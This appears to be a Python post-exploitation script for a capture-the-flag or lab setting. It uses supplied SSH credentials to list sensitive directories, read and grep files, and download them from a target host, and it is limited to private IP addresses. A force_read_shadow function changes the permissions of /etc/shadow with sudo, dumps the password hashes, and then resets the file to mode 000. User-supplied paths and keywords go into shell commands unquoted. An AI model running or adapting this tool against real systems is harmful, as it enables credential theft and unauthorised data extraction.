import paramiko
import logging
import os
from ipaddress import ip_address, ip_network

# Setup the logging directory and file
log_directory = 'logs'
log_filename = 'Fileextraction_errors.log'

if not os.path.exists(log_directory):
    os.makedirs(log_directory)

log_file_path = os.path.join(log_directory, log_filename)

# Configure logging
logging.basicConfig(
    filename=log_file_path,
    filemode='a',  # Append mode
    level=logging.ERROR,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def is_private_ip(ip):
    """ Check if an IP address is private. """
    try:
        ip_obj = ip_address(ip)
        private_networks = [
            ip_network('10.0.0.0/8'),
            ip_network('172.16.0.0/12'),
            ip_network('192.168.0.0/16'),
            ip_network('127.0.0.0/8')  # Including loopback addresses as private
        ]
        return any(ip_obj in net for net in private_networks)
    except ValueError:
        return False  # If IP is invalid, treat it as non-private

def list_files_in_common_dirs(host, ssh_user, ssh_password, directories):
    """ List files in common directories on a remote machine via SSH. """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    results = {}
    try:
        client.connect(host, username=ssh_user, password=ssh_password, timeout=10)
        for directory in directories:
            command = f'ls -la {directory}'
            stdin, stdout, stderr = client.exec_command(command)
            output = stdout.read().decode().strip()
            
            if stdout.channel.recv_exit_status() == 0:
                results[directory] = output.split('\n')
            else:
                results[directory] = [f"Error listing directory: {stderr.read().decode().strip()}"]

    finally:
        client.close()
    return results

def force_read_shadow(host, ssh_user, ssh_password):
    """ Automatically change permissions, read shadow, and restore original permissions. """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username=ssh_user, password=ssh_password, timeout=10)
        
        # Change permissions temporarily
        client.exec_command("sudo chmod 644 /etc/shadow")
        
        # Read the shadow file
        command = "cat //etc/shadow"
        stdin, stdout, stderr = client.exec_command(command)
        shadow_content = stdout.read().decode().strip()

        # Restore original permissions
        client.exec_command("sudo chmod 000 /etc/shadow")

        return shadow_content if shadow_content else "❌ Could not read `/etc/shadow`. Try manually changing permissions."
    
    finally:
        client.close()

def view_file_content(host, ssh_user, ssh_password, file_path):
    """ View the contents of a specific file on a remote machine. """
    if file_path == "/etc/shadow":
        return force_read_shadow(host, ssh_user, ssh_password)

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username=ssh_user, password=ssh_password, timeout=10)
        command = f"cat {file_path}"
        stdin, stdout, stderr = client.exec_command(command)
        
        if stdout.channel.recv_exit_status() == 0:
            return stdout.read().decode().strip()
        else:
            return f"Error reading file: {stderr.read().decode().strip()}"
    finally:
        client.close()

def view_directory_contents(host, ssh_user, ssh_password, directory_path):
    """ View the contents of a specified directory. """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username=ssh_user, password=ssh_password, timeout=10)
        command = f"ls -la {directory_path}"
        stdin, stdout, stderr = client.exec_command(command)
        
        if stdout.channel.recv_exit_status() == 0:
            return stdout.read().decode().strip()  # Directory contents
        else:
            return f"Error reading directory: {stderr.read().decode().strip()}"
    finally:
        client.close()

def search_keyword_in_file(host, ssh_user, ssh_password, file_path, keyword):
    """ Search for a specific keyword inside a file. """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username=ssh_user, password=ssh_password, timeout=10)
        command = f"grep -i '{keyword}' {file_path}"
        stdin, stdout, stderr = client.exec_command(command)
        
        if stdout.channel.recv_exit_status() == 0:
            return stdout.read().decode().strip()
        else:
            return f"❌ No matches found for '{keyword}' in {file_path}."
    finally:
        client.close()

def download_file(host, ssh_user, ssh_password, remote_file_path, local_file_path):
    """ Download a file from the remote machine to the local machine. """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username=ssh_user, password=ssh_password, timeout=10)
        sftp = client.open_sftp()
        sftp.get(remote_file_path, local_file_path)  # Download the file
        sftp.close()
        return f"✅ Successfully downloaded {remote_file_path} to {local_file_path}"
    except Exception as e:
        return f"❌ Error downloading file: {str(e)}"
    finally:
        client.close()

if __name__ == "__main__":
    target_host = input("Enter the target host IP or hostname: ").strip()
    if not target_host:
        logging.error("ERROR: Target IP required. Please try again.")
        print(f"⚠ ERROR: Target IP required. Please try again. Your error has been logged in {log_file_path}.")
        exit()

    if not is_private_ip(target_host):
        logging.error(f"ERROR: Unauthorized scan attempt on public IP address {target_host}. Exiting.")
        print(f"⚠ ERROR: Unauthorized scan attempt on public IP address {target_host}. Exiting. Your error has been logged in {log_file_path}.")
        exit()

    username = input("Enter SSH username: ").strip()
    password = input("Enter SSH password: ").strip()
    common_directories = ["/home", "/root", "/var/www", "/etc", "/etc/shadow"]

    directory_contents = list_files_in_common_dirs(target_host, username, password, common_directories)
    
    print("\n🔍 Listing files in specified directories...\n")
    for directory, content in directory_contents.items():
        print(f"📂 Directory: {directory}")
        for line in content:
            print(f"   {line}")
        print("\n")

    print("\n🚀 **Task complete.**")
    print("✔ Listed files in common directories")
    print("✔ Allowed manual selection of files and directories for viewing")
    print("✔ **Added feature to view directory contents**")
    print("✔ **Added keyword search feature**")
    print("✔ **Added download file feature**")

    # Final Hint for the User
    print("\n💡 **Hint:** Don't forget to download images for steganography analysis and any files that seem important! 🔍")
